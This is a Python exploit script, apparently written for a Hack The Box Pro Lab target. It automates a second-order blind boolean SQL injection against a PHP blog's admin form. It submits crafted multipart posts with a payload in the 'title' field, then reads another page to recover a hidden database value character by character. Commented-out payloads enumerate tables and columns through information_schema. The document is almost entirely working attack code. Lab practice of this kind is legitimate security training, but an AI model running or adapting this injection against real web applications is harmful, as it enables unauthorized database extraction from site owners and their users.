#!/usr/bin/env python3
'''
Created this to exploit one of the targets on a Hack The Box Pro Lab.
This script exploits a second order sql injection (blind boolean).  
'''

import requests
import string

def sqli():
    target= "152.16.1.19"
    proxies= {"http":"http://127.0.0.1:8080",
            "https":"http://127.0.0.1:8080"}
    headers={"Content-Type": "multipart/form-data;boundary=---------------------------29609271438811050402597506081"}
    cookies= {"TEST_ADMIN":"538f00ec5f4e2992033eafced683a063"}
    secret=""
    count=0
    charlist= string.digits + string.ascii_letters + string.punctuation
    
    for num in range(1,40):
        if count > 90:
            break
        else:
            pass
        for char in charlist:
            #payload=f"'or (SELECT IF(SUBSTRING(table_name,1,1)='{char}','foo',(SELECT 8013 UNION SELECT 4679))FROM information_schema.tables WHERE table_schema = 'flag' LIMIT 1)-- -"
            #payload=f"'or (SELECT IF(SUBSTRING(column_name,1,1)='{char}','foo',(SELECT 8013 UNION SELECT 4679))FROM information_schema.columns WHERE table_name='flag' AND table_schema = 'flag' LIMIT 1)-- -"
            payload=f"'or (SELECT IF(SUBSTRING(flag,{num},1)='{char}','foo',(SELECT 8013 UNION SELECT 4679))FROM flag.flag LIMIT 1)-- -"
            
            data= f'''-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="current_view"

DV
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="SortField"


-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="SelectedID"

1
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="SelectedField"


-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="SortDirection"


-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FirstRecord"

1
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="NoDV"


-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="PrintDV"


-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[5]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[9]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[13]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[17]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[21]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[25]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[29]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[33]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[37]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[41]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[45]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[49]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[53]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[57]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[61]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[65]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[69]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[73]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="FilterAnd[77]"

and
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="DisplayRecords"

all
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="title"

{payload}
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="category"

5
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="tags"

blog,php,bootstrap
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="content"

test
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="MAX_FILE_SIZE"

5120000
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="photo"; filename=""
Content-Type: application/octet-stream


-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="posted"

draft
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="update_x"

1
-----------------------------29609271438811050402597506081
Content-Disposition: form-data; name="SearchString"


-----------------------------29609271438811050402597506081--'''

            response= requests.post(url=f"http://{target}/blog/blogadmin/blogs_view.php", allow_redirects=True, verify=False, proxies=proxies, cookies=cookies, headers=headers, data=data)

            response= requests.get(url=f"http://{target}/blog/single.php?id=1", proxies=proxies, cookies=cookies, allow_redirects=True)

            if len(response.text) > 1000 and "error in your SQL" not in response.text and "Subquery returns more than 1 row" not in response.text:
                secret += char
                print(secret)
                count= 0
                break
            else:
                count +=1
                pass
    
try:
    sqli()
except KeyboardInterrupt:
    print("ctrl + c detected, exiting gracefully")
